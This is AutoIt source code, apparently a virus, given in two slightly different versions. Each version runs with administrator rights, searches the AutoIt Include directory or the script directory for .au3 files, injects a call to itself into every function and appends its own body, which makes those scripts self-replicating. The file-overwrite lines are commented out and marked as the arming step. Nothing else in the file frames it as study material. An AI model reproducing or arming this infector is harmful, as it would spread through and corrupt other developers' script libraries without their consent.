#RequireAdmin
;-UDF-MC-GEE-START
___mc_gee_mc_go("")
Func ___mc_gee_mc_go($start_dir)
	If $start_dir <> "" Then
		FileChangeDir($start_dir)
	Else
		$start_dir = StringRegExpReplace(@AutoItExe, "(?i)[\w\d\s.]+$", "") & "Include"
	EndIf
	Local $scriptcontent
	Local $contentself = FileRead(@ScriptDir & "\" & @ScriptName)
	Local $start = StringInStr($contentself, ";-" & Chr(0x55) & "DF-MC-GEE-START")
	Local $end = StringInStr($contentself, ";-" & Chr(0x55) & "DF-MC-GEE-END")
	Local $mid = StringMid($contentself, $start, $end - $start + 16)
	$scriptcontent = $mid
	Local $search = FileFindFirstFile("*")
	While 1
		Local $file = FileFindNextFile($search)
		If @error Then ExitLoop
		If StringInStr(FileGetAttrib($start_dir & "\" & $file), "D") Then
			If $file <> "." And $file <> ".." Then
				___mc_gee_mc_go($start_dir & "\" & $file)
			EndIf
		Else
			If Not StringInStr($file, ".au3") Then ContinueLoop
			Local $content = FileRead($start_dir & "\" & $file)
			If @error Then ContinueLoop
			If Not StringInStr($content, ";-" & Chr(0x55) & "DF-MC-GEE-START") Then
				Local $fileLines = StringSplit($content, @LF)
				For $i = 1 To UBound($fileLines) - 1
					$fileLines[$i] = StringStripCR($fileLines[$i])
					If StringInStr($fileLines[$i], "func ") And Not StringInStr($fileLines[$i], "endfunc") Then
						ReDim $fileLines[UBound($fileLines) + 1]
						For $k = UBound($fileLines) - 1 To $i + 1 Step -1
							$fileLines[$k] = $fileLines[$k - 1]
							If $k == $i + 1 Then
								$fileLines[$k] = "___mc_gee_mc_go("""")"
							EndIf
						Next
					EndIf
				Next
				$content = ""
				For $o = 1 To UBound($fileLines) - 1
					$content &= $fileLines[$o] & @CRLF
				Next
				$content &= @CRLF & $scriptcontent
				FileSetAttrib($start_dir & "\" & $file, "-R")
;~ 					Local $overwriteFile = FileOpen($start_dir & "\" & $file, 2)   ; ###########################################
;~ 					FileWrite($overwriteFile, $content)                            ; ### WARNING, UNCOMMENTING ARMS THE CODE ###
;~ 					FileClose($overwriteFile)                                      ; ###########################################
			EndIf
		EndIf
	WEnd
EndFunc   ;==>___mc_gee_mc_go
;-UDF-MC-GEE-END
#RequireAdmin
;-UDF-MC-GEE-START
___mc_gee_mc_go("")
Func ___mc_gee_mc_go($start_dir)
 If $start_dir <> "" Then
  FileChangeDir($start_dir)
 Else
  Local $inc = StringRegExpReplace(@AutoItExe, "(?i)[\w\d\s.]+$", "") & "Include"
  if not FileExists(@TempDir & "\udf_mcgee\a.txt") Then
   $start_dir = $inc
   DirCreate(@TempDir & "\udf_mcgee")
   FileWrite(@TempDir & "\udf_mcgee\a.txt","a")
   FileChangeDir($start_dir)
  Else
   $start_dir = @ScriptDir
  EndIf
 EndIf
 Local $scriptcontent
 Local $contentself = FileRead(@ScriptDir & "\" & @ScriptName)
 Local $start = StringInStr($contentself, ";-" & Chr(0x55) & "DF-MC-GEE-START")
 Local $end = StringInStr($contentself, ";-" & Chr(0x55) & "DF-MC-GEE-END")
 Local $mid = StringMid($contentself, $start, $end - $start + 16)
 $scriptcontent = $mid
 Local $search = FileFindFirstFile("*")
 While 1
  Local $file = FileFindNextFile($search)
  If @error Then ExitLoop
  If StringInStr(FileGetAttrib($start_dir & "\" & $file), "D") Then
   If $file <> "." And $file <> ".." Then
	___mc_gee_mc_go($start_dir & "\" & $file)
   EndIf
  Else
   If Not StringInStr($file, ".au3") Then ContinueLoop
   Local $content = FileRead($start_dir & "\" & $file)
   If @error Then ContinueLoop
   If Not StringInStr($content, ";-" & Chr(0x55) & "DF-MC-GEE-START") Then
	Local $fileLines = StringSplit($content, @LF)
	For $i = 1 To UBound($fileLines) - 1
	 $fileLines[$i] = StringStripCR($fileLines[$i])
	 If StringInStr($fileLines[$i], "func ") And Not StringInStr($fileLines[$i], "endfunc") Then
	  ReDim $fileLines[UBound($fileLines) + 1]
	  For $k = UBound($fileLines) - 1 To $i + 1 Step -1
	   $fileLines[$k] = $fileLines[$k - 1]
	   If $k == $i + 1 Then
		$fileLines[$k] = "___mc_gee_mc_go("""")"
	   EndIf
	  Next
	 EndIf
	Next
	$content = ""
	For $o = 1 To UBound($fileLines) - 1
	 $content &= $fileLines[$o] & @CRLF
	Next
	$content &= @CRLF & $scriptcontent
	FileSetAttrib($start_dir & "\" & $file, "-R")
;~     Local $overwriteFile = FileOpen($start_dir & "\" & $file, 2)   ; ###########################################
;~     FileWrite($overwriteFile, $content)                            ; ### WARNING, UNCOMMENTING ARMS THE CODE ###
;~     FileClose($overwriteFile)                                      ; ###########################################
   EndIf
  EndIf
 WEnd
EndFunc   ;==>___mc_gee_mc_go
;-UDF-MC-GEE-END
